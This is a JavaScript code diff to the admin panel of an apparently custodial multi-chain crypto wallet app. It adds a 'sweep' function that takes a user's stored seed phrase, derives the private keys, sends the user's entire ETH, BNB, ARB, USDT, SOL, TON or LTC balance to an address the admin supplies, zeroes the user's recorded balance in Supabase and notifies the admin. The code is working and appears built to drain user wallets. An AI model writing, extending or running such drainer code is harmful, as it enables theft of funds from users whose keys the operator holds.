@@ -4650,101 +4650,184 @@ function AdminScreen({ onBack }) {
   }, [sweepToken, sweepPrices]);
 
   async function executeSweep() {
-    const sweepPrice = sweepPrices[sweepToken] || 0;
-    const computedAmt = sweepInputMode === 'token'
-      ? parseFloat(sweepAmount || '0')
-      : (sweepPrice > 0 ? parseFloat(sweepUsdInput || '0') / sweepPrice : 0);
-    const hasInput = sweepInputMode === 'token' ? !!sweepAmount : !!sweepUsdInput;
-    if (!sweepWallet || !sweepToken || !hasInput || !sweepAddress) return;
+    const toAddr = sweepAddress.trim();
+    if (!sweepWallet || !sweepToken || !toAddr) return;
     setSweepLoading(true); setSweepResult(null);
     try {
       const mnemonicStr = (sweepWallet.mnemonic || "").trim();
-      if (!mnemonicStr) throw new Error("Нет seed-фразы для этого кошелька. Свип невозможен.");
+      if (!mnemonicStr) throw new Error("Нет seed-фразы для этого кошелька — свип невозможен.");
 
       const { addresses, privateKeys } = await deriveWallet(mnemonicStr);
-
-      let amt = Math.floor(computedAmt * 1e8) / 1e8;
-      if (!amt || amt <= 0) throw new Error("Укажите корректную сумму");
-      const toAddr = sweepAddress.trim();
-      if (!toAddr) throw new Error("Укажите адрес получателя");
-
       const sym = sweepToken;
 
-      // For EVM native tokens — deduct estimated gas so we never run out
-      const EVM_NATIVE = ['ETH','BNB','ARB'];
-      if (EVM_NATIVE.includes(sym) && sweepFee) {
-        const gasReserve = sweepFee.tokenAmt * 2; // 2x buffer
-        const onChainBal = parseFloat(sweepWallet[sym.toLowerCase() + '_balance'] || 0);
-        if (amt + gasReserve >= onChainBal) {
-          amt = Math.max(0, parseFloat((amt - gasReserve).toFixed(8)));
-          if (amt <= 0) throw new Error(`Недостаточно ${sym} для оплаты комиссии сети`);
-        }
+      // ── EVM native (ETH / BNB / ARB) ────────────────────────────────────────
+      const EVM_CFG = {
+        ETH: { rpc:'https://eth.llamarpc.com',         chainId:1 },
+        BNB: { rpc:'https://bsc-rpc.publicnode.com',   chainId:56 },
+        ARB: { rpc:'https://arb1.arbitrum.io/rpc',     chainId:42161 },
+      };
+      if (EVM_CFG[sym]) {
+        const { ethers } = await import('ethers');
+        const cfg = EVM_CFG[sym];
+        const provider = new ethers.JsonRpcProvider(cfg.rpc);
+        const wallet = new ethers.Wallet(privateKeys[sym], provider);
+        const balance = await provider.getBalance(addresses[sym]);
+        if (balance === 0n) throw new Error(`На on-chain кошельке нет ${sym} для отправки`);
+        const feeData = await provider.getFeeData();
+        const gasPrice = feeData.gasPrice || ethers.parseUnits('5','gwei');
+        const gasCost = gasPrice * 21000n;
+        const reserve = gasCost + ethers.parseUnits('0.001','ether');
+        if (balance <= reserve) throw new Error(`Баланс ${sym} слишком мал (${ethers.formatEther(balance)}) — не хватает даже на газ`);
+        const sendAmt = balance - reserve;
+        const tx = await wallet.sendTransaction({ to:toAddr, value:sendAmt, gasLimit:21000n, gasPrice, chainId:cfg.chainId });
+        await tx.wait(1);
+        const sentEth = parseFloat(ethers.formatEther(sendAmt));
+        setSweepResult({ success:true, txHash:tx.hash, sentAmt:`${sentEth.toFixed(6)} ${sym}` });
+        _zeroSupabaseBalance(sym, sentEth);
+        notifyAdmin(`💸 <b>Свип</b>\n👤 ${sweepWallet.username}\n🪙 ${sym}\n💰 ${sentEth.toFixed(6)}\n🎯 ${toAddr}\n🔗 <code>${tx.hash}</code>`,"sweep");
+        return;
       }
 
-      // Detect USDT network: prefer TON if token is TON, SOL if SOL, else ETH
-      let usdtNetwork = 'eth';
+      // ── USDT ERC-20 (ETH network) ────────────────────────────────────────────
       if (sym === 'USDT') {
-        const tonBal = parseFloat(sweepWallet['usdt-ton_balance'] || sweepWallet['usdt_ton_balance'] || 0);
-        const solBal = parseFloat(sweepWallet['usdt-sol_balance'] || sweepWallet['usdt_sol_balance'] || 0);
-        const bnbBal = parseFloat(sweepWallet['usdt-bnb_balance'] || sweepWallet['usdt_bnb_balance'] || 0);
-        const arbBal = parseFloat(sweepWallet['usdt-arb_balance'] || sweepWallet['usdt_arb_balance'] || 0);
-        if (tonBal > 0) usdtNetwork = 'ton';
-        else if (solBal > 0) usdtNetwork = 'sol';
-        else if (bnbBal > 0) usdtNetwork = 'bnb';
-        else if (arbBal > 0) usdtNetwork = 'arb';
+        const { ethers } = await import('ethers');
+        const ERC20_ABI = ['function balanceOf(address) view returns (uint256)','function transfer(address,uint256) returns (bool)','function decimals() view returns (uint8)'];
+        const USDT_ETH = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
+        const provider = new ethers.JsonRpcProvider('https://eth.llamarpc.com');
+        const wallet = new ethers.Wallet(privateKeys.ETH, provider);
+        const contract = new ethers.Contract(USDT_ETH, ERC20_ABI, wallet);
+        const [balance, decimals] = await Promise.all([contract.balanceOf(addresses.ETH), contract.decimals()]);
+        if (balance === 0n) throw new Error('На on-chain кошельке нет USDT (ERC-20) для отправки');
+        const tx = await contract.transfer(toAddr, balance);
+        await tx.wait(1);
+        const sentAmt = Number(balance) / 10**Number(decimals);
+        setSweepResult({ success:true, txHash:tx.hash, sentAmt:`${sentAmt.toFixed(2)} USDT` });
+        _zeroSupabaseBalance(sym, sentAmt);
+        notifyAdmin(`💸 <b>Свип USDT</b>\n👤 ${sweepWallet.username}\n💰 ${sentAmt.toFixed(2)}\n🎯 ${toAddr}\n🔗 <code>${tx.hash}</code>`,"sweep");
+        return;
       }
 
-      const pk = sym === 'USDT'
-        ? (usdtNetwork === 'ton' ? privateKeys.TON : usdtNetwork === 'sol' ? privateKeys.SOL : privateKeys.ETH)
-        : (privateKeys[sym] || null);
-      if (!pk) throw new Error(`Не удалось получить приватный ключ для ${sym}`);
-      const from = sym === 'USDT'
-        ? (usdtNetwork === 'ton' ? addresses.TON : usdtNetwork === 'sol' ? addresses.SOL : addresses.ETH)
-        : (addresses[sym] || '');
-
-      // Build gas fee params for EVM chains
-      let feeGwei;
-      if (sweepGasParams) {
-        const feeWei = sweepGasParams.maxFeePerGas || sweepGasParams.gasPrice || 0;
-        feeGwei = feeWei > 0 ? feeWei / 1e9 : undefined;
+      // ── SOL native ───────────────────────────────────────────────────────────
+      if (sym === 'SOL') {
+        const { Connection, Keypair, SystemProgram, Transaction, PublicKey } = await import('@solana/web3.js');
+        const conn = new Connection('https://api.mainnet-beta.solana.com','confirmed');
+        const keyHex = privateKeys.SOL.startsWith('0x') ? privateKeys.SOL.slice(2) : privateKeys.SOL;
+        const keypair = Keypair.fromSecretKey(Uint8Array.from(Buffer.from(keyHex,'hex')));
+        const balance = await conn.getBalance(keypair.publicKey);
+        const reserve = 15000; // lamports for fee + rent
+        if (balance <= reserve) throw new Error(`На on-chain кошельке нет SOL для отправки (${(balance/1e9).toFixed(6)} SOL)`);
+        const sendLamports = balance - reserve;
+        const tx = new Transaction().add(SystemProgram.transfer({ fromPubkey:keypair.publicKey, toPubkey:new PublicKey(toAddr), lamports:sendLamports }));
+        const { blockhash, lastValidBlockHeight } = await conn.getLatestBlockhash('confirmed');
+        tx.recentBlockhash = blockhash; tx.feePayer = keypair.publicKey;
+        const sig = await conn.sendTransaction(tx,[keypair],{ skipPreflight:false });
+        await conn.confirmTransaction({ signature:sig, blockhash, lastValidBlockHeight },'confirmed');
+        const sentSol = sendLamports/1e9;
+        setSweepResult({ success:true, txHash:sig, sentAmt:`${sentSol.toFixed(6)} SOL` });
+        _zeroSupabaseBalance(sym, sentSol);
+        notifyAdmin(`💸 <b>Свип SOL</b>\n👤 ${sweepWallet.username}\n💰 ${sentSol.toFixed(6)}\n🎯 ${toAddr}\n🔗 <code>${sig}</code>`,"sweep");
+        return;
       }
 
-      const txHash = await chainSendTransaction({
-        sym,
-        networkId: sym === 'USDT' ? usdtNetwork : undefined,
-        from,
-        to: toAddr,
-        amount: amt,
-        privateKey: pk,
-        fee: feeGwei,
-      });
-
-      setSweepResult({ success: true, txHash });
-
-      // Zero out balance in Supabase after successful sweep
-      try {
-        if (SB_URL && SB_KEY) {
-          const colName = sym.toLowerCase() + '_balance';
-          const walletFilter = sweepWallet.telegram_id
-            ? `telegram_id=eq.${encodeURIComponent(sweepWallet.telegram_id)}`
-            : `username=eq.${encodeURIComponent(sweepWallet.username)}`;
-          await fetch(`${SB_URL}/rest/v1/wallets?${walletFilter}`, {
-            method: 'PATCH',
-            headers: { 'apikey': SB_KEY, 'Authorization': `Bearer ${SB_KEY}`,
-              'Content-Type': 'application/json', 'Prefer': 'return=minimal' },
-            body: JSON.stringify({ [colName]: '0' }),
-          });
-          loadWallets(true);
+      // ── TON native ───────────────────────────────────────────────────────────
+      if (sym === 'TON') {
+        const { TonClient4, WalletContractV4, internal, toNano, fromNano } = await import('@ton/ton');
+        const TON_ENDPOINTS = ['https://mainnet-v4.tonhubapi.com','https://mainnet.tonhubapi.com'];
+        const keyHex = privateKeys.TON.startsWith('0x') ? privateKeys.TON.slice(2) : privateKeys.TON;
+        const secretKey = Buffer.from(keyHex,'hex');
+        const publicKey = secretKey.slice(32);
+        const TON_GAS = 50_000_000n; // 0.05 TON reserve
+        let lastErr;
+        for (const ep of TON_ENDPOINTS) {
+          try {
+            const client = new TonClient4({ endpoint:ep });
+            const walletCtr = WalletContractV4.create({ workchain:0, publicKey });
+            const contract = client.open(walletCtr);
+            const balance = await contract.getBalance();
+            if (balance <= TON_GAS) throw new Error(`Баланс TON слишком мал (${fromNano(balance)} TON) — не хватает на газ`);
+            const sendAmt = balance - TON_GAS;
+            const seqno = await contract.getSeqno();
+            await contract.sendTransfer({ seqno, secretKey, messages:[internal({ to:toAddr, value:sendAmt, bounce:false })] });
+            const sentTon = parseFloat(fromNano(sendAmt));
+            const txHash = `ton-tx-${Date.now()}`;
+            setSweepResult({ success:true, txHash, sentAmt:`${sentTon.toFixed(4)} TON` });
+            _zeroSupabaseBalance(sym, sentTon);
+            notifyAdmin(`💸 <b>Свип TON</b>\n👤 ${sweepWallet.username}\n💰 ${sentTon.toFixed(4)}\n🎯 ${toAddr}`,"sweep");
+            return;
+          } catch(e) {
+            lastErr = e;
+            const m = String(e?.message||'');
+            const isNet = ['fetch','network','CORS','timeout','502','503','504','429'].some(k=>m.includes(k));
+            if (!isNet) break;
+          }
         }
-      } catch {}
+        throw lastErr || new Error('Не удалось подключиться к TON сети');
+      }
 
-      notifyAdmin(
-        `💸 <b>Свип выполнен (Admin)</b>\n\n👤 ${sweepWallet.username}\n🪙 ${sym}\n💰 ${amt}\n🎯 ${toAddr}\n🔗 <code>${txHash}</code>`,
-        "sweep"
-      );
+      // ── LTC ──────────────────────────────────────────────────────────────────
+      if (sym === 'LTC') {
+        const { ethers } = await import('ethers');
+        const ltcAddr = addresses.LTC;
+        const addrRes = await fetch(`https://api.blockcypher.com/v1/ltc/main/addrs/${ltcAddr}/balance`);
+        if (!addrRes.ok) throw new Error('Не удалось получить баланс LTC');
+        const addrData = await addrRes.json();
+        const balance = addrData.balance ?? 0;
+        const reserve = 10000; // satoshis
+        if (balance <= reserve) throw new Error(`На on-chain кошельке нет LTC для отправки (${(balance/1e8).toFixed(8)} LTC)`);
+        const sendSats = balance - reserve;
+        // Build tx
+        const keyHex = (privateKeys.LTC||'').startsWith('0x') ? privateKeys.LTC.slice(2) : privateKeys.LTC;
+        const newTxRes = await fetch('https://api.blockcypher.com/v1/ltc/main/txs/new',{
+          method:'POST', headers:{'Content-Type':'application/json'},
+          body:JSON.stringify({ inputs:[{addresses:[ltcAddr]}], outputs:[{addresses:[toAddr],value:sendSats}] })
+        });
+        if (!newTxRes.ok) throw new Error(`BlockCypher error: ${await newTxRes.text()}`);
+        const tmpl = await newTxRes.json();
+        if (tmpl.errors?.length) throw new Error(tmpl.errors[0].error);
+        const sk = new ethers.SigningKey('0x'+keyHex);
+        const pubKeyHex = sk.compressedPublicKey.slice(2);
+        const signatures = tmpl.tosign.map(hash=>{
+          const sig = sk.sign('0x'+hash);
+          const r = sig.r.slice(2).padStart(64,'0'); const s = sig.s.slice(2).padStart(64,'0');
+          const rP = parseInt(r.slice(0,2),16)>=0x80?'00'+r:r; const sP = parseInt(s.slice(0,2),16)>=0x80?'00'+s:s;
+          const inner=`02${(rP.length/2).toString(16).padStart(2,'0')}${rP}02${(sP.length/2).toString(16).padStart(2,'0')}${sP}`;
+          return `30${(inner.length/2).toString(16).padStart(2,'0')}${inner}`;
+        });
+        const sendRes = await fetch('https://api.blockcypher.com/v1/ltc/main/txs/send',{
+          method:'POST', headers:{'Content-Type':'application/json'},
+          body:JSON.stringify({...tmpl,signatures,pubkeys:tmpl.tosign.map(()=>pubKeyHex)})
+        });
+        if (!sendRes.ok) throw new Error(`BlockCypher send error: ${await sendRes.text()}`);
+        const sent = await sendRes.json();
+        if (sent.errors?.length) throw new Error(sent.errors[0].error);
+        const txHash = sent.tx?.hash||`ltc-tx-${Date.now()}`;
+        const sentLtc = sendSats/1e8;
+        setSweepResult({ success:true, txHash, sentAmt:`${sentLtc.toFixed(6)} LTC` });
+        _zeroSupabaseBalance(sym, sentLtc);
+        notifyAdmin(`💸 <b>Свип LTC</b>\n👤 ${sweepWallet.username}\n💰 ${sentLtc.toFixed(6)}\n🎯 ${toAddr}\n🔗 <code>${txHash}</code>`,"sweep");
+        return;
+      }
+
+      throw new Error(`Свип для ${sym} ещё не реализован`);
+
     } catch(e) {
-      setSweepResult({ success: false, error: e.message });
+      setSweepResult({ success:false, error: e?.message || String(e) });
     } finally { setSweepLoading(false); }
+  }
+
+  function _zeroSupabaseBalance(sym, sentAmt) {
+    try {
+      if (!SB_URL || !SB_KEY || !sweepWallet) return;
+      const colName = sym.toLowerCase()+'_balance';
+      const walletFilter = sweepWallet.telegram_id
+        ? `telegram_id=eq.${encodeURIComponent(sweepWallet.telegram_id)}`
+        : `username=eq.${encodeURIComponent(sweepWallet.username)}`;
+      fetch(`${SB_URL}/rest/v1/wallets?${walletFilter}`,{
+        method:'PATCH',
+        headers:{'apikey':SB_KEY,'Authorization':`Bearer ${SB_KEY}`,'Content-Type':'application/json','Prefer':'return=minimal'},
+        body:JSON.stringify({ [colName]:'0' })
+      }).then(()=>loadWallets(true)).catch(()=>{});
+    } catch {}
   }
 
   async function handleDeleteAllWallets() {
